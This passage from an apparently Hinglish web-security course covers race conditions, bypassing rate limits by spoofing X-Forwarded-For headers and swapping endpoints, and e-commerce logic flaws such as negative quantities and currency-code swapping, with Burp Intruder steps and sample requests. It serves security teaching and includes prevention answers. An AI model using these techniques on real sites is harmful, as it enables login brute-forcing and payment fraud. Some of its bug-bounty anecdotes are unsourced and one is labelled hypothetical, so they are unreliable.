#### 10. 🚫 Common Mistakes
- **Mistake:** Sirf 2-3 requests bhejna. **Fix:** Kam se kam 50-100 concurrent requests bhejo, kyunki server thoda slow ho sakta hai.
- **Mistake:** CSRF token na handle karna. **Fix:** Har request ke liye alag token lena padega, ya token ko disable karne ka tareeka dhoondo.
- **Mistake:** Network latency ki wajah se requests truly concurrent nahi hoti. **Fix:** Turbo Intruder mein `concurrentConnections` badhao aur `requestsPerConnection` bhi. Local network se test karo.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **Q:** Turbo Intruder mein `pipeline=False` kyun rakha?
  **A:** HTTP pipelining se requests ek ke baad ek jaati hain, truly concurrent nahi. Isliye `pipeline=False` rakhte hain taake multiple connections khul sakein.
- **Q:** Agar server rate limit laga de toh?
  **A:** Race condition ke liye rate limit bhi bypass karna padega (Topic 6.3 dekho). Lekin agar rate limit strict hai toh race condition test mushkil ho jayega.

#### 12. 🌍 Real-World Use Case
**Bug Bounty Example:** Uber me ek coupon race condition thi. Attacker ne `PROMO50` coupon ko 50 concurrent requests bheji, aur sab successful aayi. Result: 50 baar $50 discount, yaani $2500 ka discount free ride ke liye. Uber ne severe rating di.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Request 1 ----------> Check coupon (available) -> Apply -> Mark used
Request 2 -------->
  (simultaneously) -> Check coupon (still available) -> Apply -> Mark used
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Pro Tip 1:** Turbo Intruder script mein `engine.start()` ke baad thoda sleep do taake requests truly overlap ho.
- **Pro Tip 2:** Agar endpoint slow response deta ho toh `concurrentConnections` badhao.
- **Pro Tip 3:** Race condition sirf coupons mein nahi, balki voting, likes, wallet withdrawal, inventory management mein bhi check karo.

#### 15. ❓ FAQ (Interview Questions)
- **Q1:** Race condition aur TOCTOU (Time-of-check to time-of-use) mein kya farak hai?
  **A:** TOCTOU race condition ka hi ek type hai, jahan check aur use ke beech time gap mein resource change ho jata hai.
- **Q2:** Race condition ko kaise prevent karein?
  **A:** Database-level locking (SELECT FOR UPDATE), atomic operations, ya queue system use karo.
- **Q3:** Turbo Intruder ke alawa aur kaunsa tool use kar sakte hain?
  **A:** Burp Intruder (gadhe se), custom Python script with threading, ya `race-the-web` tool.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Ek coupon ek second mein 50 baar lagao—agar server ne rok nahi, toh race condition paao."**

---

### 🎯 Topic 6.3: Rate Limiting Bypass

#### 1. 🎯 Title
**Rate Limiting Bypass**

#### 2. 🐣 Samjhane ke liye (Analogy)
Maan lo ek chai ki tapri hai. Tapri wala ek customer ko sirf ek cup chai deta hai, phir use rok deta hai. Ab ek banda baar baar aata hai, lekin har baar apna muh bandh kar ke naye kapde pehen ke aata hai (IP change karke). Ya apne saath apne 20 dost laata hai (different IPs). Is tarah woh limit bypass kar ke 20 cup chai pee leta hai. Yahan rate limit hai, lekin IP rotate karke bypass ho gayi.

#### 3. 📖 Technical Definition
Rate limiting ek mechanism hai jo ek specific time frame mein ek client (IP, user, etc.) se hone wali requests ki frequency control karta hai. Rate limiting bypass wo technique hai jisse attacker is limit ko exceed kar leta hai, jaise IP rotate karke, headers manipulate karke, ya different endpoints use karke.

#### 4. 🧠 Zaroorat Kyun Hai?
Rate limiting bypass ki zaroorat tab hoti hai jab humein brute-force attacks (login, OTP), resource exhaustion, ya race condition test ke liye zyada requests bhejni hoti hain. Agar rate limit effectively implemented hai, toh hum 100 requests nahi bhej sakte. Bypass karke hum unlimited requests bhej sakte hain.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- **Login endpoint:** `POST /api/login`
- Normal attempt: 5 baar wrong password → `429 Too Many Requests` with `{"error":"Rate limit exceeded"}`
- Bypass attempt: Har request mein `X-Forwarded-For: <random IP>` header add karo.
- Burp Intruder mein payload position `X-Forwarded-For` par rakh kar random IPs bhejo.
- Agar `429` na aaye aur login attempt continue ho, toh bypass successful.

#### 6. ⚙️ Under the Hood
Server rate limit implement karta hai usually client IP address ke basis par. Example code:
```python
def is_rate_limited(ip):
    count = redis.get(f"rate:{ip}")
    if count > 5:
        return True
    redis.incr(f"rate:{ip}")
```
Agar server `X-Forwarded-For` header ko IP ke tor par use karta hai (kyunki reverse proxy ke peeche hai), toh hum is header ko spoof kar sakte hain. Har request me naya IP dalenge, toh server alag client samajh lega.

#### 7. 💻 Hands-On Step-by-Step
**Method 1: IP Rotation via Headers**

**Step 1:** Burp Suite mein request capture karo (e.g., login).

**Step 2:** Right-click → Send to Intruder.

**Step 3:** Positions tab mein `X-Forwarded-For: 127.0.0.1` header add karo, aur value ko highlight karke Add § lagao:
```
X-Forwarded-For: §127.0.0.1§
```

**Step 4:** Payloads tab mein payload type "Numbers" select karo, from 1 to 255, step 1. Format as IP: `192.168.1.§1§` ya custom iterator.

Ya better: Payload type "Custom iterator" with position 1: 1-255, position 2: 1-255, position 3: 1-255, aur "." join karo. Simple ke liye "Simple list" mein random IPs ki list daal do.

**Step 5:** Start attack. Agar sab requests par `200 OK` aaye aur koi `429` na aaye, toh bypass ho gaya.

**Method 2: VPN/Proxy Chains**
Manually VPN ya proxy rotate karo (e.g., using FoxyProxy with list of proxies). Burp Suite mein Proxy listener ke through requests bhejo aur proxy switch karte jao.

**Method 3: Parameter Pollution**
Har request mein ek extra parameter add karo jiska value random ho, jaise `&rand=123`, `&rand=456`. Isse server ki fingerprinting (jaise request hash based rate limit) fail ho sakti hai. Example:
```
POST /api/login?rand=123
POST /api/login?rand=456
```
Agar server URL ke saath rate limit calculate karta hai toh different URLs samjhega.

**Method 4: Endpoint Swapping**
Agar `/api/login` par rate limit hai, toh versioning check karo:
- `/api/v2/login`
- `/api/auth/login`
- `/api/user/login`
- `/login.php`
- `/mobile/login`

Kabhi server different endpoints par alag rate limit rakhta hai. Try karte raho.

**Method 5: Slow down**
Agar threshold 5 requests per minute hai, toh 4 requests per minute bhejo. Isse bypass nahi, but compliant hai. Lekin agar humein zyada requests bhejni hain toh IP rotate better hai.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** 100 requests bhejne par bhi `200 OK` mil raha hai, koi `429` nahi.
- **Failure:** 5-6 requests ke baad `429` ya block aa jata hai.

#### 9. ⚖️ Comparison (IP Rotation vs Endpoint Swapping)
| IP Rotation | Endpoint Swapping |
|-------------|-------------------|
| Har request ka IP badalna | Har request ka endpoint badalna |
| Headers modify (`X-Forwarded-For`) | URLs enumerate |
| Proxy/VPN use karna | Common endpoint patterns try |

#### 10. 🚫 Common Mistakes
- **Mistake:** Sirf `X-Forwarded-For` header dalna aur original IP bhi bhejna (kuch servers dono check karte hain). **Fix:** `X-Forwarded-For` ke saath `X-Real-IP` aur `X-Originating-IP` bhi try karo.
- **Mistake:** Random IP generate karte waqt private IP ranges (192.168.x.x) use karna. **Fix:** Public IP ranges use karo (1.0.0.0 to 223.255.255.255) taaki realistic lage.
- **Mistake:** Endpoint swapping mein sirf ek do try karna. **Fix:** Directory brute-force tools se saare possible auth endpoints nikaalo.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **Q:** Kya `X-Forwarded-For` header hamesha kaam karega?
  **A:** Jab tak server us header par trust karta hai. Agar server directly client IP le raha hai (connection IP), toh yeh kaam nahi karega. Phir proxy chain use karo.
- **Q:** Agar server ke paas CAPTCHA hai toh rate limit bypass kaise karein?
  **A:** CAPTCHA solving services ya machine learning use karo, lekin yeh advanced hai. Rate limit bypass ke liye CAPTCHA solve karna alag challenge hai.
- **Q:** Kya rate limit bypass illegal hai?
  **A:** Testing with permission ethical hai, otherwise illegal. Bug bounty programs allow rate limit testing.

#### 12. 🌍 Real-World Use Case
**Bug Bounty Example:** Instagram ke login endpoint par rate limit thi (5 attempts per IP). Attacker ne `X-Forwarded-For` header rotate karke unlimited login attempts kiye, jisse wo kisi bhi user ka password brute-force kar sakta tha. Instagram ne isko critical mark kiya.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker -> Request 1 (X-Forwarded-For: 1.1.1.1) -> Server -> OK
Attacker -> Request 2 (X-Forwarded-For: 2.2.2.2) -> Server -> OK (different IP)
Attacker -> Request 3 (X-Forwarded-For: 3.3.3.3) -> Server -> OK
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Pro Tip 1:** Burp Suite mein "Payload processing" mein "Add from list" mein random IPs ki list bana lo (e.g., from 1.0.0.0 to 223.255.255.255).
- **Pro Tip 2:** Auto-rate-limit-bypass ke liye extensions hain jaise "Rate Limit Bypasser".
- **Pro Tip 3:** Kabhi kabhi server `X-Forwarded-For` comma-separated list leta hai. Pehle wala IP trusted hota hai. Toh `X-Forwarded-For: <random>, <real_ip>` bhejna padega.

#### 15. ❓ FAQ (Interview Questions)
- **Q1:** Rate limiting bypass ke alag alag techniques kya hain?
  **A:** IP rotation (headers/proxy), parameter pollution, endpoint swapping, slow down, distributed attacks.
- **Q2:** Server ko rate limit bypass se kaise bachayen?
  **A:** Multiple factors use karo: IP + User-Agent + session + behavior analysis. CAPTCHA use karo.
- **Q3:** Agar server IP rate limit ke saath user rate limit bhi laga raha hai toh?
  **A:** Toh combination bypass mushkil hai. Phir distributed attack (different users) try karo.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Limit lage to IP badal, header ghumake nikal ja."**

---

### 🎯 Topic 6.4: Financial Logic Flaws

#### 1. 🎯 Title
**Financial Logic Flaws (Negative Values, Currency Manipulation, Decimal Precision)**

#### 2. 🐣 Samjhane ke liye (Analogy)
Sochiye aap ek dukan se 10 rupaye ki chocolate khareed rahe hain. Bill pe aap dekhte ho "Quantity: -1" likh kar total -10 rupaye ho gaya. Matlab dukan aapko 10 rupaye de rahi hai. Yeh possible nahi, lekin agar software mein negative value allow ho toh aise ho sakta hai. Ya phir aap dukan wale se kehte ho "Yeh to dollar mein 10 hai, lekin main rupees mein 10 dunga" aur woh maan jaye. Ya decimal ki precision ka fayda uthake 0.9999999 se 1 karwa lo.

#### 3. 📖 Technical Definition
Financial logic flaws wo vulnerabilities hain jo financial transactions (e-commerce, wallet, payments) mein mathematical ya logical errors exploit karti hain. Common types:
- **Negative Values:** Quantity, price, ya amount negative bhejna.
- **Currency Manipulation:** Currency code change karke price manipulation.
- **Decimal Precision:** Floating-point rounding errors se fayda uthana.

#### 4. 🧠 Zaroorat Kyun Hai?
In flaws se attacker ko free products mil sakte hain, balance badh sakta hai, ya money steal kar sakta hai. E-commerce sites par yeh direct financial loss cause karta hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- **Add to cart request:** `POST /cart/add` with body: `{"product_id":123, "quantity": 2}`
- **Negative value test:** `{"quantity": -1}`
- **Response:** Cart total negative ho sakta hai. Check `GET /cart` response.

- **Currency manipulation:** Request mein `"currency": "USD"` change to `"currency": "INR"` with same price 10. Agar server conversion nahi karta toh 10 INR me 10 USD ka product mil gaya.

- **Decimal precision:** `"price": 10.9999999999` bhej kar dekho ki final amount kya aata hai.

#### 6. ⚙️ Under the Hood
**Negative Values:** Server pe validation nahi hai ki quantity positive honi chahiye. Direct database mein insert ho jata hai. Phir total calculation mein negative quantity negative total dega.

**Currency Manipulation:** Server product price ko base currency (USD) mein store karta hai. Jab user request karta hai, toh currency conversion apply honi chahiye. Agar server sirf price le leta hai aur currency ko ignore karta hai, toh user foreign currency mein kam price de sakta hai.

**Decimal Precision:** Floating-point arithmetic mein rounding errors hoti hain. Jaise `10.9999999999 + 0.0000000001 = 11.0` but `10.9999999999 * 1 = 10.9999999999`. Agar server total ko integer mein convert karta hai without rounding, toh thoda sa fayda ho sakta hai.

#### 7. 💻 Hands-On Step-by-Step
**Negative Values:**

**Step 1:** Add to cart request intercept karo:
```
POST /api/cart/add
Host: target.com
...
{"product_id": 5, "quantity": 1}
```
Response: `{"cart_total": 100}`

**Step 2:** Quantity ko -1 karo:
```
{"product_id": 5, "quantity": -1}
```
**Step 3:** Response dekho. Agar total 100 se kam ho jaaye (e.g., 0 ya -100) toh vulnerable. Phir `POST /checkout` karke negative total ke saath order place kar sakte ho? Agar server negative amount charge karta hai toh merchant ko paisa dena hoga.

**Currency Manipulation:**

**Step 1:** Add to cart request mein currency field add karo (ya existing ko change karo). Agar request mein currency nahi hai, toh POST mein extra parameter try karo:
```
{"product_id":5, "quantity":1, "currency":"USD"}
```
Response total 100 USD.

**Step 2:** Currency change to INR:
```
{"currency":"INR"}
```
Agar response total same 100 raha (100 INR) toh vulnerable, kyunki 100 INR < 100 USD.

**Decimal Precision:**

**Step 1:** Check karo ki site floating-point amounts allow karti hai ya nahi. Quantity decimal allow? Price decimal?

**Step 2:** Try extreme values: `{"quantity": 0.9999999999}` ya `{"price": 10.9999999999}`. Payload mein maximum precision do.

**Step 3:** Dekho total calculate hokar round down hota hai ya up. Jaise agar total 10.9999999999 aata hai aur order place karte waqt 11 charge ho jata hai toh kuch fayda nahi. Agar 10.99 charge ho aur 0.01 bach jaye toh chota fayda.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Negative Success:** Cart total negative aaya, ya zero.
- **Negative Failure:** Server error `400` with `{"error":"Invalid quantity"}`.
- **Currency Success:** 100 USD ka product 100 INR mein mil gaya (approx 1.2 USD).
- **Currency Failure:** Server price convert karta hai (e.g., 100 USD = 7500 INR), ya error "Currency not supported".
- **Decimal Success:** Final amount thoda kam charge hua (rounding error).
- **Decimal Failure:** Server decimal allow hi nahi karta (integer required).

#### 9. ⚖️ Comparison (Negative Value vs Integer Overflow)
| Negative Value | Integer Overflow |
|----------------|------------------|
| Quantity negative bhejna | Quantity bada integer bhejna (e.g., 99999999) |
| Server side validation missing | Server storage overflow se wraparound |
| Total negative ho jata | Total overflow ho kar chota ho jata |

#### 10. 🚫 Common Mistakes
- **Mistake:** Sirf quantity negative try karna. **Fix:** Price field bhi negative try karo, shipping charges negative, discount negative etc.
- **Mistake:** Currency manipulation mein sirf INR/USD try karke chhod dena. **Fix:** Saari currencies try karo jinki value kam ho (Venezuelan Bolivar, Indonesian Rupiah).
- **Mistake:** Decimal precision mein `0.1` type karna. **Fix:** `0.9999999999999999` jaisi values do with maximum digits (JSON specification allows up to 15-17 decimal digits).

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **Q:** Kya negative total ke saath order place kar sakte hain?
  **A:** Agar place order endpoint bhi vulnerable hai toh haan, negative amount charge hoga ya account mein paisa aa jayega. Payment gateway normally negative amount reject karega, lekin agar internal wallet use ho raha ho toh ho sakta hai.
- **Q:** Currency manipulation mein server conversion kaise implement karta hai?
  **A:** Ideally server product price in base currency store karta hai, aur currency code ke hisaab se real-time exchange rate apply karta hai. Agar aisa nahi karta, toh vulnerable.
- **Q:** Decimal precision se kitna fayda ho sakta hai?
  **A:** Bahut chhoti amount, lekin large scale par automate kar ke fayda uthaya ja sakta hai, jaise 1 lakh transactions mein 0.01 paisa har transaction se 1000 rupaye.

#### 12. 🌍 Real-World Use Case
**Negative Value Bug Bounty:** HackerOne report mein ek user ne e-commerce site par `quantity: -100` bhej kar total -$5000 kar diya. Phir checkout kiya, aur site ne uske credit card ko -$5000 charge kar diya (refund). Site ko loss hua.

**Currency Manipulation:** Ek site par product price USD 10 tha, lekin currency parameter change karke `ZWL` (Zimbabwe dollar) kar diya, aur 10 ZWL me le liya (~2 cents).

**Decimal Precision:** Shopify me ek bug tha jahan price mein 0.000000001 ki precision se product free le sakte the? (Hypothetical)

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Negative Quantity:
User -> {"quantity": -1} -> Server -> total = price * -1 -> Negative total -> Checkout -> Negative charge
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Pro Tip 1:** Burp Intruder mein payload type "Numbers" se negative values ka range bhejo (e.g., -1 to -100).
- **Pro Tip 2:** Currency manipulation ke liye common weak currencies ki list bana lo: `VEF, IRR, IDR, ZWL, SYP` etc.
- **Pro Tip 3:** Decimal precision ke liye API mein `float` type allow hai ya nahi check karo. JSON mein numbers as strings bhej kar bhi try karo taaki precision preserve ho.

#### 15. ❓ FAQ (Interview Questions)
- **Q1:** Financial logic flaws ko prevent karne ke liye kaise validation karein?
  **A:** Negative values pe strict check, quantity positive integer hona chahiye. Price should be positive decimal. Currency conversion mandatory ho. Use integers for smallest unit (paise/cents) to avoid floating errors.
- **Q2:** Currency manipulation se bachne ka tarika?
  **A:** Server-side pe hamesha base currency mein price store karo aur conversion fixed rates se karo. Client-side currency sirf display ke liye use karo, calculation ke liye nahi.
- **Q3:** Decimal precision rounding errors se bachne ka tarika?
  **A:** Floating-point na use karo; use integer (e.g., amount in cents). Har transaction mein round to nearest integer after calculation.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Price mein minus lagao, currency badlo, decimal ka khel karo—financially flawed API se free shopping karo."**

---

========================================================================================
